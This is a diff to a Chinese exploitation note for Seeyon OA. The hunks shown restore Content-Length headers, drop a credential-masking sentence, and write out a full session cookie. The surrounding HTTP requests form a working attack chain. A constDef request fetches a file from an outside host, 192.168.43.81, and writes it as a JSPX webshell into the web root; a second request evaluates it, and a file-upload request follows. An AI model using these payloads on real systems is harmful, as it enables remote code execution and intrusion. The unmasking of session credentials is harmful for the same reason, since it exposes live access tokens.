@@ -41,7 +41,7 @@ schema_version: "1"
 
 ## 操作风险
 
-文件写入/上传示例可能留下文件、覆盖数据或触发脚本执行；命令/代码执行示例可能改变主机状态。保留原示例供静态分析；仅可在明确授权的隔离测试环境验证，事先准备备份与回滚。凭据示例如含星号，仅保留首尾用于说明，不能直接使用。
+文件写入/上传示例可能留下文件、覆盖数据或触发脚本执行；命令/代码执行示例可能改变主机状态。保留原示例供静态分析；仅可在明确授权的隔离测试环境验证，事先准备备份与回滚。
 
 ## 技术资料与来源记录
 
@@ -118,13 +118,14 @@ Accept-Encoding: gzip, deflate
 Cookie: JSESSIONID=F72080DF26DFA10AF113DF1F6BC38530; hostname=172.16.135.220:8089; login_locale=zh_CN; loginPageURL=
 Connection: close
 Content-Type: application/x-www-form-urlencoded
+Content-Length: 545
 
 method=newConstDef&constKey=uddd1&constDefine=new+File('../webapps/ROOT/test.jspx')+<<+new+URL('http%3a//192.168.43.81%3a18080/123.txt').text&constType=2
 
 
 ```
 
-> 请求长度说明：原资料 Content-Length 为 545；静态长度已移除，应由客户端根据最终请求体的字节数生成。
+> 请求长度说明：原资料 Content-Length 为 545；保留原始标头；其数值未据实际请求体重新计算或验证。
 
 ![](https://mmbiz.qpic.cn/sz_mmbiz_png/hiauU5HOHMaHMv0SrBOdGaS1cWBkwD8ZpibtrFwGYhZKP4L7Y6JfBzRXHf7Qg0ncDiaU3lNlNpKA5avDoicpEzNaMA/640?wx_fmt=png&from=appmsg)
 
@@ -140,13 +141,14 @@ Accept-Encoding: gzip, deflate
 Cookie: JSESSIONID=F72080DF26DFA10AF113DF1F6BC38530; hostname=172.16.135.220:8089; login_locale=zh_CN; loginPageURL=
 Connection: close
 Content-Type: application/x-www-form-urlencoded
+Content-Length: 89
 
 method=newConstDef&constKey=runtime1c2345accaccc&constDefine=evaluate+$uddd1&constType=3
 
 
 ```
 
-> 请求长度说明：原资料 Content-Length 为 89；静态长度已移除，应由客户端根据最终请求体的字节数生成。
+> 请求长度说明：原资料 Content-Length 为 89；保留原始标头；其数值未据实际请求体重新计算或验证。
 
 ![](https://mmbiz.qpic.cn/sz_mmbiz_png/hiauU5HOHMaHMv0SrBOdGaS1cWBkwD8ZpjBsmE05FlabL4Ap3PnrvxGcuddtjibgibQRcj7S6tjZic5qGoCYXRrqfw/640?wx_fmt=png&from=appmsg)
 
@@ -162,13 +164,14 @@ Accept-Encoding: gzip, deflate
 Cookie: JSESSIONID=F72080DF26DFA10AF113DF1F6BC38530; hostname=172.16.135.220:8089; login_locale=zh_CN; loginPageURL=
 Connection: close
 Content-Type: application/x-www-form-urlencoded
+Content-Length: 35
 
 method=listConstDef&page=1&rows=100
 
 
 ```
 
-> 请求长度说明：原资料 Content-Length 为 35；静态长度已移除，应由客户端根据最终请求体的字节数生成。
+> 请求长度说明：原资料 Content-Length 为 35；保留原始标头；其数值未据实际请求体重新计算或验证。
 
 ![](https://mmbiz.qpic.cn/sz_mmbiz_png/hiauU5HOHMaHMv0SrBOdGaS1cWBkwD8Zpjk6T4nyaZrbVs5XibyiaXywTeUfibhJiaRxrUicr2KcoRYicic4fV0D3H9jPA/640?wx_fmt=png&from=appmsg)
 
@@ -185,10 +188,11 @@ _**> Step1：**_
 ```http
 POST /seeyon/fileUpload.do?method=processUpload&maxSize= HTTP/1.1
 Host: 172.16.135.236:8089
-Cookie: JSESSIONID=0D3102C6
+Cookie: JSESSIONID=0D3102C6F8445B2207B3A29DF9C4BAE6
 Connection: close
 Upgrade-Insecure-Requests: 1
 Content-Type: multipart/form-data; boundary=---------------------------1416682316313
+Content-Length: 1172
 
 -----------------------------1416682316313
 Content-Disposition: form-data; 
@@ -228,7 +232,7 @@ Content-Type: Image/x-zip-compressed
 
 ```
 
-> 请求长度说明：原资料 Content-Length 为 1172；静态长度已移除，应由客户端根据最终请求体的字节数生成。
+> 请求长度说明：原资料 Content-Length 为 1172；保留原始标头；其数值未据实际请求体重新计算或验证。
 
 ![](https://mmbiz.qpic.cn/sz_mmbiz_png/hiauU5HOHMaHMv0SrBOdGaS1cWBkwD8ZpHxzjftBlSwqfhichiaibunhxjCQWGAK5aVe8kJmwlqW1Kq0BtZu0GUMLg/640?wx_fmt=png&from=appmsg)
 
